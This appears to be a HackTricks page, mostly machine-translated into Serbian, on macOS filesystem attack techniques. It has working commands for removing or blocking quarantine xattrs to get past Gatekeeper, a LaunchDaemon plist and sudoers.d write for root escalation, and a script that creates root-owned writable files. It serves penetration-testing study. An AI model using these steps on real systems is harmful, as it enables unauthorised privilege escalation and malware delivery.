# macOS FS Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## POSIX dozvole kombinacije

Dozvole u **direktorijumu**:

* **čitanje** - možete **nabrojati** unose u direktorijumu
* **pisanje** - možete **brisati/pisati** **fajlove** u direktorijumu i možete **brisati prazne foldere**.
* Ali ne možete **brisati/modifikovati neprazne foldere** osim ako nemate dozvolu za pisanje nad njima.
* Ne možete **modifikovati ime foldera** osim ako ga ne posedujete.
* **izvršavanje** - **dozvoljeno vam je da prolazite** kroz direktorijum - ako nemate ovo pravo, ne možete pristupiti nijednom fajlu unutar njega, niti u bilo kojim poddirektorijumima.

### Opasne kombinacije

**Kako prepisati fajl/folder koji poseduje root**, ali:

* Jedan roditeljski **vlasnik direktorijuma** u putanji je korisnik
* Jedan roditeljski **vlasnik direktorijuma** u putanji je **grupa korisnika** sa **pristupom za pisanje**
* Grupa korisnika ima **pristup za pisanje** do **fajla**

Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** **sim/link** na očekivanu putanju da bi dobio privilegovano proizvoljno pisanje.

### Folder root R+X Poseban slučaj

Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, ti fajlovi su **nedostupni bilo kome drugom**. Tako da ranjivost koja omogućava **premestiti fajl koji je čitljiv od strane korisnika**, koji ne može biti pročitan zbog te **ograničenja**, iz ovog foldera **u drugi**, može se iskoristiti da se pročitaju ti fajlovi.

Primer u: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Simbolička veza / Hard veza

Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa nižim privilegijama**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa nižim privilegijama. Korisnik bi mogao samo **usmeriti na drugi fajl** putem simboličke ili hard veze, i privilegovani proces će pisati na taj fajl.

Proverite u drugim sekcijama gde bi napadač mogao **iskoristiti proizvoljno pisanje za eskalaciju privilegija**.

## .fileloc

Fajlovi sa **`.fileloc`** ekstenzijom mogu ukazivati na druge aplikacije ili binarne fajlove, tako da kada se otvore, aplikacija/binarni fajl će biti onaj koji se izvršava.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Arbitrary FD

Ako možete da **naterate proces da otvori datoteku ili folder sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvorite datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da `exploit.py` dobije FD do datoteke unutar `/etc/sudoers` i zloupotrebi je.

Na primer: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Izbegavajte trikove sa xattrs karantinom

### Uklonite to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ako datoteka/folder ima ovu nepromenljivu atribut, neće biti moguće postaviti xattr na nju.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

**devfs** montaža **ne podržava xattr**, više informacija u [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ova ACL sprečava dodavanje `xattrs` na datoteku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** формат фајла копира фајл укључујући његове ACE-ове.

У [**изворном коду**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) је могуће видети да ће текстуална репрезентација ACL-а која се чува у xattr-у под називом **`com.apple.acl.text`** бити постављена као ACL у распакованом фајлу. Дакле, ако сте компримовали апликацију у zip фајл са **AppleDouble** форматом фајла са ACL-ом који спречава да се други xattrs запишу у њега... xattr за карантин није био постављен у апликацију:

Проверите [**оригинални извештај**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) за више информација.

Да бисмо то реплицирали, прво морамо добити исправан acl стринг:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Nije baš potrebno, ali ostavljam to tu za svaki slučaj:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Obilaženje kodnih potpisa

Paketi sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **paketu**. Imajte na umu da je hash CodeResources takođe **ugrađen u izvršni fajl**, tako da ne možemo ni s tim da se igramo.

Međutim, postoje neke datoteke čiji se potpis neće proveravati, ove imaju ključ omit u plist-u, kao:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Moguće je izračunati potpis resursa iz CLI-a sa: 

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Montiranje dmga

Korisnik može montirati prilagođeni dmg kreiran čak i na postojećim folderima. Ovako možete kreirati prilagođeni dmg paket sa prilagođenim sadržajem:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Obično macOS montira disk razgovarajući sa `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisom (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako dodate parametar `-d` u LaunchDaemons plist datoteku i ponovo pokrenete, čuvaće logove u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.

## Arbitrarne pisanja

### Periodični sh skripti

Ako vaša skripta može biti interpretirana kao **shell skripta**, mogli biste prepisati **`/etc/periodic/daily/999.local`** shell skriptu koja će se pokretati svaki dan.

Možete **fingirati** izvršenje ove skripte sa: **`sudo periodic daily`**

### Daemoni

Napišite arbitrarnu **LaunchDaemon** kao **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist-om koji izvršava arbitrarnu skriptu kao:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.

## Generate writable files as other users

This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). This might also work as privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Deljena Memorija

**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkom memorijskom prostoru, olakšavajući bržu komunikaciju u poređenju sa drugim metodama međuprocesne komunikacije. To uključuje kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()`, i mapiranje u adresni prostor procesa koristeći `mmap()`. Procesi zatim mogu direktno čitati i pisati u ovaj memorijski prostor. Da bi se upravljalo istovremenim pristupom i sprečila korupcija podataka, mehanizmi sinhronizacije kao što su mutexi ili semafori se često koriste. Na kraju, procesi demapiraju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, i opcionalno uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je posebno efikasan za brzu IPC u okruženjima gde više procesa treba brzo da pristupi deljenim podacima.

<details>

<summary>Primer Koda Proizvođača</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Primer potrošačkog koda</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Zaštićeni Deskriptor

**macOS zaštićeni deskriptor** je bezbednosna funkcija uvedena u macOS kako bi se poboljšala sigurnost i pouzdanost **operacija sa deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptor pružaju način za povezivanje specifičnih ograničenja ili "čuvara" sa deskriptorima datoteka, koja se sprovode od strane jezgra.

Ova funkcija je posebno korisna za sprečavanje određenih klasa bezbednosnih ranjivosti kao što su **neovlašćen pristup datotekama** ili **trkačke uslove**. Ove ranjivosti se javljaju kada, na primer, jedan nit pristupa opisu datoteke dajući **drugom ranjivom niti pristup** ili kada deskriptor datoteke bude **nasleđen** od ranjivog procesa. Neke funkcije povezane sa ovom funkcionalnošću su:

* `guarded_open_np`: Otvara FD sa čuvarom
* `guarded_close_np`: Zatvara ga
* `change_fdguard_np`: Menja zastavice čuvara na deskriptoru (čak i uklanjajući zaštitu čuvara)

## Reference

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
